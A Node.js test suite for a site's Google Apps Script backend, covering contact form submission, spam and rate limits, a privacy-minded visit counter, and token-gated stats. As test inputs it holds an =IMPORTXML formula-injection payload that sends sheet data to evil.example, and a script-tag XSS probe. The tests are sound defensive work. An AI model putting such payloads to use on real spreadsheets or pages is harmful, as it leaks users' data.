// Tests for the contact form's Apps Script backend (google-apps-script/Code.gs).
//
// The script only runs inside Google's runtime, so nothing exercised it: the
// JavaScript-free form path returned "Something went wrong — undefined" for
// every submission, successful ones included, and no test could have said so.
// This loads Code.gs into a VM with small in-memory stand-ins for the Apps
// Script services it calls, and drives doPost the way the two clients do.
//
// The same script keeps the site's visit counts (POST ?action=count from
// count.js, GET ?action=stats for the build of stats.html), and the second
// half of this file drives those the same way: what one visit adds, that a
// second visit the same day adds to the same rows, that a payload which is
// not exactly schema v1 changes nothing, and that the contact form still
// behaves exactly as it did: that the counter waits for the shared lock
// only briefly, and not at all past its per-minute ceiling, so a burst of
// counts cannot make a message time out; that a message from a browser that
// asks not to be tracked is not counted; and that the unsuppressed daily
// totals are served to the weekly build's token and to nobody else.
//
// Run with: node tests/apps-script.test.js

const fs = require('fs');
const path = require('path');
const vm = require('vm');
const crypto = require('crypto');

const ROOT = path.join(__dirname, '..');
const SOURCE = fs.readFileSync(path.join(ROOT, 'google-apps-script', 'Code.gs'), 'utf8');

let failures = 0;
function assert(cond, msg) {
    if (cond) {
        console.log('PASS:', msg);
    } else {
        console.log('FAIL:', msg);
        failures++;
    }
}

// A fixed "now" for the counter's dates: 10:00 UTC is noon in Amsterdam, so
// no test lands on the wrong side of midnight.
const NOW = Date.UTC(2026, 8, 26, 10, 0, 0);
const DAY = 24 * 60 * 60 * 1000;

/**
 * One tab of a spreadsheet: a grid of cells addressed from 1, as Apps Script
 * addresses them. Like Sheets, a cell not formatted as plain text ('@') turns
 * a date-like string into a Date and a numeric one into a number, so a
 * missing setNumberFormat('@') shows up as a changed value, not a pass.
 */
function makeSheet(name, realmDate) {
    const rows = [];
    const formats = new Map();
    const coerce = (value, format) => {
        if (format === '@' || typeof value !== 'string') return format === '@' ? String(value) : value;
        if (/^\d{4}-\d{2}-\d{2}$/.test(value)) return new realmDate(`${value}T00:00:00+02:00`);
        if (/^-?\d+(\.\d+)?$/.test(value)) return Number(value);
        return value;
    };
    const range = (row, col, numRows, numCols) => ({
        setFontWeight() { return this; },
        setBackground() { return this; },
        setFontColor() { return this; },
        setNumberFormat(format) {
            for (let r = 0; r < numRows; r++) for (let c = 0; c < numCols; c++) formats.set(`${row + r}:${col + c}`, format);
            return this;
        },
        getValues() {
            const out = [];
            for (let r = 0; r < numRows; r++) {
                const line = [];
                for (let c = 0; c < numCols; c++) {
                    const v = (rows[row + r - 1] || [])[col + c - 1];
                    line.push(v === undefined ? '' : v);
                }
                out.push(line);
            }
            return out;
        },
        setValues(values) {
            // Apps Script refuses a grid that does not match the range.
            if (values.length !== numRows || values.some(v => v.length !== numCols)) {
                throw new Error(`setValues: ${values.length}x${(values[0] || []).length} into a ${numRows}x${numCols} range`);
            }
            values.forEach((line, r) => {
                const target = rows[row + r - 1] || (rows[row + r - 1] = []);
                line.forEach((v, c) => { target[col + c - 1] = coerce(v, formats.get(`${row + r}:${col + c}`)); });
            });
            return this;
        }
    });
    return {
        rows,
        getName: () => name,
        getLastRow: () => rows.length,
        appendRow: (r) => rows.push(r),
        getRange: (row, col = 1, numRows = 1, numCols = 1) => range(row, col, numRows, numCols),
        setFrozenRows() {}
    };
}

/** A fresh Apps Script world: a spreadsheet of tabs, one cache, one outbox. */
function world(props = {}, options = {}) {
    const cache = new Map();
    const mail = [];
    const errors = [];
    const lock = { taken: 0, released: 0, refuse: false, waits: [] };
    let now = options.now || NOW;

    const ctx = vm.createContext({});
    // Code.gs reads the clock through the realm's own Date, so that is the
    // one to fix; instanceof Date still works because the prototype is shared.
    vm.runInContext(`(function () {
        var RealDate = Date;
        function FixedDate() {
            return arguments.length ? new (Function.prototype.bind.apply(RealDate, [null].concat([].slice.call(arguments))))() : new RealDate(FixedDate.now());
        }
        FixedDate.prototype = RealDate.prototype;
        FixedDate.UTC = RealDate.UTC;
        FixedDate.parse = RealDate.parse;
        FixedDate.RealDate = RealDate;
        Date = FixedDate;
    })()`, ctx);
    ctx.Date.now = () => now;
    const RealmDate = ctx.Date.RealDate;

    const sheets = new Map();
    const spreadsheet = {
        getSheetByName: (name) => sheets.get(name) || null,
        insertSheet: (name) => {
            const s = makeSheet(name, RealmDate);
            sheets.set(name, s);
            return s;
        }
    };

    const services = {
        PropertiesService: {
            getScriptProperties: () => ({
                getProperty: (k) => ({ SPREADSHEET_ID: 'sheet-id', OWNER_EMAIL: 'owner@example.com', ...props })[k] || null
            })
        },
        CacheService: {
            getScriptCache: () => ({
                get: (k) => (cache.has(k) ? cache.get(k) : null),
                put: (k, v) => cache.set(k, v)
            })
        },
        Utilities: {
            DigestAlgorithm: { SHA_256: 'sha256' },
            Charset: { UTF_8: 'utf8' },
            // Apps Script hands back signed bytes; so does this.
            computeDigest: (alg, s) => Array.from(crypto.createHash(alg).update(s).digest(), b => (b > 127 ? b - 256 : b)),
            // Only the one pattern Code.gs uses.
            formatDate: (date, tz, pattern) => {
                if (pattern !== 'yyyy-MM-dd') throw new Error(`formatDate: unsupported pattern ${pattern}`);
                return new Intl.DateTimeFormat('en-CA', { timeZone: tz, year: 'numeric', month: '2-digit', day: '2-digit' }).format(date);
            }
        },
        SpreadsheetApp: {
            openById: () => spreadsheet,
            flush() {}
        },
        LockService: {
            getScriptLock: () => ({
                tryLock: (ms) => { lock.waits.push(ms); if (lock.refuse) return false; lock.taken++; return true; },
                releaseLock() { lock.released++; }
            })
        },
        MailApp: { sendEmail: (to, subject, body, opts) => mail.push({ to, subject, body, opts }) },
        UrlFetchApp: { fetch: () => { throw new Error('no network in tests'); } },
        ContentService: {
            MimeType: { JSON: 'json' },
            createTextOutput: (text) => ({ kind: 'text', getContent: () => text, setMimeType() { return this; } })
        },
        HtmlService: { createHtmlOutput: (html) => ({ kind: 'html', getContent: () => html }) },
        ScriptApp: { getService: () => ({ getUrl: () => 'https://script.example/exec' }) },
        Logger: { log() {} },
        console: { error: (...a) => errors.push(a.join(' ')), log() {} }
    };

    Object.assign(ctx, services);
    vm.runInContext(SOURCE, ctx, { filename: 'Code.gs' });
    // The contact form's tab exists from the start, as it does in a deployed sheet.
    spreadsheet.insertSheet('Responses');
    return {
        ctx,
        mail,
        errors,
        lock,
        sheets,
        get rows() { return sheets.get('Responses').rows; },
        tab: (name) => (sheets.get(name) ? sheets.get(name).rows : null),
        setNow: (ms) => { now = ms; },
        RealmDate
    };
}

const valid = { name: 'Ada', email: 'ada@example.com', subject: 'Hello', message: 'A question about groundwater.' };

/** The site's fetch: a JSON string body. */
const postJson = (w, data) => w.ctx.doPost({ postData: { type: 'text/plain', contents: JSON.stringify(data) } });

/** A browser with JavaScript off: the <form> posts itself. */
const postForm = (w, data) => w.ctx.doPost({ postData: { type: 'application/x-www-form-urlencoded' }, parameter: data });

// --- The JavaScript path answers in JSON --------------------------------
{
    const w = world();
    const out = postJson(w, valid);
    const body = JSON.parse(out.getContent());
    assert(out.kind === 'text' && body.status === 'success', `JSON path: a valid submission succeeds (${body.status}: ${body.message})`);
    assert(w.rows.length === 2, `JSON path: the submission lands in the sheet under the header row (${w.rows.length} rows)`);
    assert(w.mail.length === 1 && w.mail[0].to === 'owner@example.com', 'JSON path: the owner is notified');
    assert(w.mail[0] && w.mail[0].opts.replyTo === valid.email && !w.mail[0].opts.cc, 'JSON path: the visitor is reply-to, never copied');

    const bad = JSON.parse(postJson(world(), { ...valid, email: 'not-an-address' }).getContent());
    assert(bad.status === 'error' && /valid email/i.test(bad.message), `JSON path: a rejection carries its reason (${bad.message})`);
}

// --- The JavaScript-free path answers with a page -----------------------
{
    const w = world();
    const out = postForm(w, valid);
    const html = out.getContent();
    assert(out.kind === 'html', 'Form path: a form post is answered with a page, not JSON');
    assert(/Thank you/.test(html) && !/Something went wrong/.test(html), 'Form path: a recorded submission is reported as sent');
    assert(!/undefined/.test(html), 'Form path: the page never says "undefined"');
    assert(w.rows.length === 2, 'Form path: the submission lands in the sheet');

    const rejected = postForm(world(), { ...valid, message: '' }).getContent();
    assert(/Something went wrong/.test(rejected) && /required/.test(rejected), 'Form path: a rejection says what was wrong');
    assert(/href="https:\/\/moseskolleh\.github\.io\/sustaintheworld\/#contact"/.test(rejected), 'Form path: the page links back to the form');

    const hostile = postForm(world(), { ...valid, message: '<script>alert(1)</script>', email: 'x' }).getContent();
    assert(!/<script>alert/.test(hostile), 'Form path: nothing the visitor sent is echoed unescaped');
}

// --- What reaches the sheet is inert -----------------------------------
{
    const w = world();
    postJson(w, { ...valid, message: '=IMPORTXML("https://evil.example/?d="&A1,"//a")', subject: '+1+1' });
    const row = w.rows[1] || [];
    assert(String(row[4]).startsWith("'="), 'Sheet: a formula in the message is stored as text');
    assert(String(row[3]).startsWith("'+"), 'Sheet: a formula in the subject is stored as text');
    assert(w.ctx.testFormulaEscaping().length === 0, "Sheet: the script's own escaping tests pass");
}

// --- The honeypot and the limits ---------------------------------------
{
    const w = world();
    const trapped = JSON.parse(postJson(w, { ...valid, website: 'http://spam.example' }).getContent());
    assert(trapped.status === 'success' && w.rows.length === 0 && w.mail.length === 0, 'Honeypot: a bot is told it succeeded, and nothing is recorded or sent');

    postJson(w, valid);
    const again = JSON.parse(postJson(w, valid).getContent());
    assert(again.status === 'error' && /wait a moment/.test(again.message), `Rate limit: a second message straight after the first is held back (${again.message})`);

    const other = JSON.parse(postJson(w, { ...valid, email: 'grace@example.com' }).getContent());
    assert(other.status === 'success', "Rate limit: one visitor's throttle does not block another");
}

// =========================================================================
// The visit counter: POST ?action=count, GET ?action=stats
// =========================================================================
// count.js sends exactly this shape (schema v1). The same example is at the
// top of count.js and in README.md; tests/count.test.js holds them together.
const beacon = {
    v: 1, page: 'index', lens: '', deepest: 'contact',
    features: ['cv-download-hero', 'module-dossier'],
    ref: 'www.linkedin.com', vp: 'm', kb: 284
};

/** What count.js does: a text/plain body to ?action=count. */
const postCount = (w, payload, extra = {}) => w.ctx.doPost({
    parameter: { action: 'count', ...extra },
    postData: { type: 'text/plain', contents: typeof payload === 'string' ? payload : JSON.stringify(payload) }
});
// The weekly build's token; a world made with STATS_TOKEN set to it serves
// the rows to getStats, and to no request without it.
const TOKEN = 'a-long-random-string-only-the-weekly-build-has';
const getStats = (w, extra = {}) => w.ctx.doGet({ parameter: { action: 'stats', token: TOKEN, ...extra } });

const TODAY = '2026-09-26';
const daily = (w, tab = 'Daily') => (w.tab(tab) || []).slice(1);
const cell = (w, metric, key, tab = 'Daily', date = TODAY) => {
    const row = daily(w, tab).find(r => r[0] === date && r[1] === metric && r[2] === key);
    return row ? row[3] : undefined;
};
const snapshot = (w) => JSON.stringify(Array.from(w.sheets.entries()).map(([n, s]) => [n, s.rows]));

// --- An accepted visit lands on the right totals ------------------------
{
    const w = world();
    const out = postCount(w, beacon);
    assert(out.getContent() === '', 'Counter: the reply is empty — nothing reads it, and nothing is said');

    const tab = w.tab('Daily');
    assert(!!tab && JSON.stringify(tab[0]) === '["date","metric","key","count"]', 'Counter: a "Daily" tab is created with the header date,metric,key,count');
    const expected = [
        ['visits', '', 1], ['page', 'index', 1], ['vp', 'm', 1], ['deepest', 'contact', 1],
        ['ref', 'www.linkedin.com', 1], ['feature', 'cv-download-hero', 1], ['feature', 'module-dossier', 1], ['kb', '', 284]
    ];
    const wrong = expected.filter(([m, k, n]) => cell(w, m, k) !== n);
    assert(wrong.length === 0, `Counter: one visit adds one to each of its totals, and its KB to kb (wrong: ${JSON.stringify(wrong)})`);
    assert(daily(w).length === expected.length, `Counter: one row per (date, metric, key) and nothing else — an empty lens adds no row (${daily(w).length} rows)`);
    assert(daily(w).every(r => [0, 1, 2].every(i => typeof r[i] === 'string')),
        'Counter: date, metric and key are stored as plain text (not re-read by Sheets as a date or a number)');
    assert(w.rows.length === 0 && w.mail.length === 0, 'Counter: the contact sheet and the owner\'s inbox are untouched');
    assert(w.lock.taken === 1 && w.lock.released === 1, `Counter: the write happens inside the script lock, which is released (${w.lock.taken} taken, ${w.lock.released} released)`);
    assert(w.errors.length === 0, `Counter: nothing was logged as an error (${w.errors.join(' | ')})`);
}

// --- A second visit the same day increments, it does not append ----------
{
    const w = world();
    postCount(w, beacon);
    const rowsAfterOne = daily(w).length;
    postCount(w, { ...beacon, page: 'case-studies', lens: 'water', deepest: 'csGrid', features: ['module-dossier', 'lens-water'], ref: '', vp: 's', kb: 100 });
    assert(cell(w, 'visits', '') === 2, 'Counter: a second visit makes visits 2');
    assert(cell(w, 'feature', 'module-dossier') === 2, 'Counter: a feature both visits used is counted twice, on one row');
    assert(cell(w, 'kb', '') === 384, `Counter: kb is the sum of both visits' KB (${cell(w, 'kb', '')})`);
    assert(cell(w, 'page', 'index') === 1 && cell(w, 'page', 'case-studies') === 1, 'Counter: each page keeps its own total');
    assert(cell(w, 'lens', 'water') === 1 && cell(w, 'deepest', 'csGrid') === 1, 'Counter: lens and deepest keys are recorded as sent');
    assert(cell(w, 'ref', 'www.linkedin.com') === 1, 'Counter: a visit with no referrer adds nothing to ref');
    // New keys only: page, lens, deepest, one feature, vp s = 5 rows.
    assert(daily(w).length === rowsAfterOne + 5, `Counter: the tab grows by new keys only (${rowsAfterOne} → ${daily(w).length} rows)`);

    // The next day starts a block of its own below, and leaves this one alone.
    const before = JSON.stringify(daily(w));
    w.setNow(NOW + DAY);
    postCount(w, beacon);
    assert(JSON.stringify(daily(w).slice(0, rowsAfterOne + 5)) === before, 'Counter: a new day leaves the previous day\'s totals as they were');
    assert(cell(w, 'visits', '', 'Daily', '2026-09-27') === 1, 'Counter: a new day starts its own totals at 1');
}

// --- Today's block is found however long the history above it -----------
{
    const w = world();
    w.ctx.DAILY_READ_CHUNK = 3;            // force several reads upwards
    const tab = w.ctx.getDailySheet(w.ctx.getConfig(), 'Daily');
    for (let i = 0; i < 7; i++) tab.appendRow(['2026-09-25', 'feature', `old-${i}`, 5]);
    for (let i = 0; i < 8; i++) tab.appendRow([TODAY, 'feature', `f-${i}`, 1]);
    postCount(w, { ...beacon, features: ['f-0', 'f-7'] });
    assert(cell(w, 'feature', 'f-0') === 2 && cell(w, 'feature', 'f-7') === 2,
        'Counter: a key at the top of a long day, several reads up, is incremented rather than appended');
    assert(daily(w).filter(r => r[2] === 'f-0').length === 1, 'Counter: ...and appears once');
    assert(daily(w).filter(r => r[0] === '2026-09-25').every(r => r[3] === 5), 'Counter: the previous day is not touched');
}

// --- Anything that is not exactly schema v1 changes nothing --------------
{
    const long = 'a'.repeat(41);
    const invalid = {
        'an extra key': { ...beacon, ua: 'Mozilla/5.0' },
        'a missing key': (() => { const b = { ...beacon }; delete b.kb; return b; })(),
        'an id smuggled in as a key': { ...beacon, id: 'abc123' },
        'the wrong version': { ...beacon, v: 2 },
        'v as a string': { ...beacon, v: '1' },
        'kb as a string': { ...beacon, kb: '284' },
        'kb as a fraction': { ...beacon, kb: 2.5 },
        'a negative kb': { ...beacon, kb: -1 },
        'a huge kb': { ...beacon, kb: 100001 },
        'kb as null (what JSON makes of Infinity)': { ...beacon, kb: null },
        'features as a string': { ...beacon, features: 'cv-download-hero' },
        '21 features': { ...beacon, features: Array.from({ length: 21 }, (_, i) => `f-${i}`) },
        'a repeated feature': { ...beacon, features: ['cv-download-hero', 'cv-download-hero'] },
        'a feature with capitals': { ...beacon, features: ['CV'] },
        'a feature that is a formula': { ...beacon, features: ['=1+1'] },
        'a feature over 40 characters': { ...beacon, features: [long] },
        'a lens over 40 characters': { ...beacon, lens: long },
        'a page with a path in it': { ...beacon, page: '../index' },
        'an empty page': { ...beacon, page: '' },
        'a deepest that is not an id': { ...beacon, deepest: 'a b' },
        'a full referrer URL instead of a host': { ...beacon, ref: 'https://www.linkedin.com/in/someone' },
        'an over-long referrer host': { ...beacon, ref: 'a'.repeat(254) },
        'an unknown viewport class': { ...beacon, vp: 'xl' },
        'a number for page': { ...beacon, page: 404 },
        'an array': [beacon],
        'null': null,
        'not JSON': '{"v":1,',
        'an empty body': '',
        'a body over 4 KB': JSON.stringify({ ...beacon, pad: 'x'.repeat(5000) })
    };
    const w = world();
    postCount(w, beacon);
    const before = snapshot(w);
    const lockBefore = w.lock.taken;
    const moved = [];
    const replied = [];
    Object.entries(invalid).forEach(([why, payload]) => {
        const out = postCount(w, payload);
        if (snapshot(w) !== before) moved.push(why);
        if (out.getContent() !== '') replied.push(why);
    });
    assert(moved.length === 0, `Counter: ${Object.keys(invalid).length} kinds of invalid payload change nothing (changed: ${moved.join('; ') || 'none'})`);
    assert(replied.length === 0, `Counter: a rejection gets the same empty reply as a success (said something: ${replied.join('; ') || 'none'})`);
    assert(w.lock.taken === lockBefore, 'Counter: a rejected payload is turned away before the lock is even taken');

    const fresh = world();
    postCount(fresh, { ...beacon, extra: 1 });
    assert(fresh.tab('Daily') === null, 'Counter: a rejected payload does not even create the tab');
}

// --- The lock --------------------------------------------------------------
{
    const w = world();
    w.lock.refuse = true;
    let threw = false;
    let out;
    try { out = postCount(w, beacon); } catch (e) { threw = true; }
    assert(!threw && out.getContent() === '', 'Counter: when the lock cannot be had, the visit is dropped quietly, not thrown');
    assert(w.tab('Daily') === null, 'Counter: ...and nothing is written without the lock');
}

// --- The health-check hook: ?test=1 -----------------------------------------
{
    const w = world();
    postCount(w, beacon, { test: '1' });
    assert(w.tab('Daily') === null && cell(w, 'visits', '', 'DailyTest') === 1, 'Counter: ?test=1 writes to DailyTest and leaves Daily alone');
    const rows = w.ctx.testCounter();
    assert(rows.length > 0 && cell(w, 'visits', '', 'DailyTest') === 2, "Counter: the script's own testCounter() round-trips a visit through DailyTest");
}

// --- A contact message that says action=count is not a contact message ---
{
    const w = world();
    const out = w.ctx.doPost({ parameter: { action: 'count' }, postData: { type: 'text/plain', contents: JSON.stringify(valid) } });
    assert(out.getContent() === '' && w.rows.length === 0 && w.mail.length === 0 && w.tab('Daily') === null,
        'Routing: ?action=count never reaches the contact path, whatever the body says');
}

// --- GET ?action=stats serves the rows --------------------------------------
{
    const w = world({ STATS_TOKEN: TOKEN });
    const tab = w.ctx.getDailySheet(w.ctx.getConfig(), 'Daily');
    tab.appendRow(['2025-08-01', 'visits', '', 9]);     // more than 400 days before 2026-09-26
    tab.appendRow(['2025-09-01', 'visits', '', 7]);
    tab.appendRow(['2025-09-01', 'nonsense', '', 3]);   // not a metric
    tab.appendRow(['not a date', 'visits', '', 3]);
    tab.appendRow([new w.RealmDate('2025-09-02T00:00:00+02:00'), 'page', 404, 2]);   // a hand-reformatted row
    postCount(w, beacon);

    const out = getStats(w);
    const body = JSON.parse(out.getContent());
    assert(body.v === 1 && Array.isArray(body.rows) && Object.keys(body).length === 2, 'Stats: the reply is {"v":1,"rows":[...]}');
    assert(body.rows.every(r => r.length === 4 && /^\d{4}-\d{2}-\d{2}$/.test(r[0]) && typeof r[1] === 'string' && typeof r[2] === 'string' && typeof r[3] === 'number'),
        'Stats: every row is [date, metric, key, count] with a YYYY-MM-DD date and a numeric count');
    assert(body.rows.some(r => r[0] === TODAY && r[1] === 'kb' && r[3] === 284), "Stats: today's totals are there");
    assert(body.rows.some(r => r[0] === '2025-09-01' && r[1] === 'visits' && r[3] === 7), 'Stats: a day inside the last 400 is there');
    assert(!body.rows.some(r => r[0] === '2025-08-01'), 'Stats: a day more than 400 days ago is left out');
    assert(!body.rows.some(r => r[1] === 'nonsense' || r[0] === 'not a date'), 'Stats: rows that are not the aggregate are skipped');
    assert(body.rows.some(r => r[0] === '2025-09-02' && r[2] === '404'), 'Stats: a row Sheets re-read as a date and a number comes back as text');

    const test = JSON.parse(getStats(w, { test: '1' }).getContent());
    assert(Array.isArray(test.rows) && test.rows.length === 0, 'Stats: ?test=1 reads DailyTest, which is empty here');

    const health = JSON.parse(w.ctx.doGet({ parameter: {} }).getContent());
    assert(health.status === 'ok' && !('rows' in health), 'Stats: without ?action=stats, GET is still the plain health check');

    const broken = JSON.parse(getStats(world({ SPREADSHEET_ID: '', STATS_TOKEN: TOKEN })).getContent());
    assert(!('rows' in broken) && broken.status === 'error', 'Stats: a failure has no rows at all, so a build cannot mistake it for a week of zeros');
}

// --- ...and only to the weekly build's token ---------------------------------
// The rows are unsuppressed, and this deployment's address is in count.js on
// every page; stats.html promises that no count under 5 and no single day's
// count is ever published.
{
    const w = world({ STATS_TOKEN: TOKEN });
    postCount(w, beacon);
    const refused = (label, parameter, props) => {
        const target = props ? world(props) : w;
        if (props) postCount(target, beacon);
        const body = JSON.parse(target.ctx.doGet({ parameter: { action: 'stats', ...parameter } }).getContent());
        assert(body.status === 'refused' && !('rows' in body) && !/linkedin|visits/.test(JSON.stringify(body)),
            `Stats: ${label} is refused, with no rows (${body.status})`);
    };
    refused('a request with no token', {});
    refused('a wrong token', { token: 'guess' });
    refused('the token less its last character', { token: TOKEN.slice(0, -1) });
    refused('the token with a character added', { token: `${TOKEN}x` });
    refused('the test tab without the token', { test: '1' });
    refused('any request while STATS_TOKEN is unset', { token: '' }, {});
    refused('...even one whose token is "null"', { token: 'null' }, {});

    const body = JSON.parse(getStats(w).getContent());
    assert(Array.isArray(body.rows) && body.rows.some(r => r[1] === 'ref' && r[2] === 'www.linkedin.com'), 'Stats: the right token gets the rows');
    assert(w.ctx.sameSecret(TOKEN, TOKEN) && !w.ctx.sameSecret('', TOKEN) && !w.ctx.sameSecret(undefined, TOKEN) && !w.ctx.sameSecret(TOKEN.toUpperCase(), TOKEN),
        'Stats: the token check matches the exact string only');
}

// --- A count never keeps a message waiting ------------------------------------
// Counts and messages share the script lock. A message waits up to 15 s for
// it; a count waits briefly, and past a ceiling a minute does not ask at all,
// so a burst of page views cannot queue in front of someone's message.
{
    const w = world();
    postCount(w, beacon);
    const countWait = w.lock.waits[w.lock.waits.length - 1];
    postJson(w, valid);
    // A message takes the lock twice: once for its row, once for the tally.
    const [rowWait, tallyWait] = w.lock.waits.slice(-2);
    assert(countWait <= 2000 && tallyWait <= 2000, `Lock: a count waits at most 2 s for the lock the form shares (${countWait} ms, the contact tally ${tallyWait} ms)`);
    assert(rowWait >= 10000, `Lock: a message still waits as long as it always did for its own row (${rowWait} ms)`);

    const burst = world();
    const cap = burst.ctx.COUNT_MAX_PER_MINUTE;
    for (let i = 0; i < cap + 10; i++) postCount(burst, beacon);
    assert(cell(burst, 'visits', '') === cap && burst.lock.taken === cap,
        `Lock: past ${cap} counts in a minute, the rest are dropped before the lock is asked for (${burst.lock.taken} taken for ${cap + 10})`);
    const sent = JSON.parse(postJson(burst, valid).getContent());
    assert(sent.status === 'success' && burst.rows.length === 2, 'Lock: a message sent in the middle of that burst is recorded');
    burst.setNow(NOW + 60 * 1000);
    postCount(burst, beacon);
    assert(cell(burst, 'visits', '') === cap + 1, 'Lock: the next minute counts again');

    const busy = world();
    busy.lock.refuse = true;
    postCount(busy, beacon);
    busy.lock.refuse = false;
    const after = JSON.parse(postJson(busy, valid).getContent());
    assert(after.status === 'success' && busy.rows.length === 2 && busy.tab('Daily').length === 2,
        'Lock: a count that could not have the lock is dropped, and the next message is recorded and counted');
}

// --- The contact form still works, and counts itself ----------------------
{
    const w = world();
    const out = JSON.parse(postJson(w, valid).getContent());
    assert(out.status === 'success' && w.rows.length === 2 && w.mail.length === 1, 'Contact + counter: a message is still recorded and sent as before');
    assert(cell(w, 'contact', '') === 1, "Contact + counter: an accepted message adds one to today's contact total");

    postForm(w, { ...valid, email: 'grace@example.com' });
    assert(cell(w, 'contact', '') === 2, 'Contact + counter: so does one sent without JavaScript');

    postJson(w, { ...valid, email: 'not-an-address' });
    postJson(w, { ...valid, email: 'bot@example.com', website: 'http://spam.example' });
    postJson(w, valid);                     // held back by the rate limit
    assert(cell(w, 'contact', '') === 2, 'Contact + counter: a rejected, trapped or rate-limited message adds nothing');
    assert(daily(w).length === 1, 'Contact + counter: contact is one row a day, not one per message');
    assert(w.errors.length === 0, `Contact + counter: nothing was logged as an error (${w.errors.join(' | ')})`);

    // The site's script says count: false when the browser sends Do Not
    // Track or Global Privacy Control; stats.html promises such a visitor is
    // in none of its figures.
    const quiet = world();
    const quietOut = JSON.parse(postJson(quiet, { ...valid, count: false }).getContent());
    assert(quietOut.status === 'success' && quiet.rows.length === 2 && quiet.mail.length === 1 && quiet.tab('Daily') === null,
        'Contact + counter: a message marked count: false is recorded and sent, and not counted');
    const noCount = world();
    noCount.ctx.addToDaily = () => { throw new Error('sheet unavailable'); };
    const saved = JSON.parse(postJson(noCount, valid).getContent());
    assert(saved.status === 'success' && noCount.rows.length === 2, 'Contact + counter: a count that fails does not fail the message');
}

if (failures > 0) {
    console.log(`\n${failures} assertion(s) failed`);
    process.exit(1);
}
console.log('\nAll assertions passed');
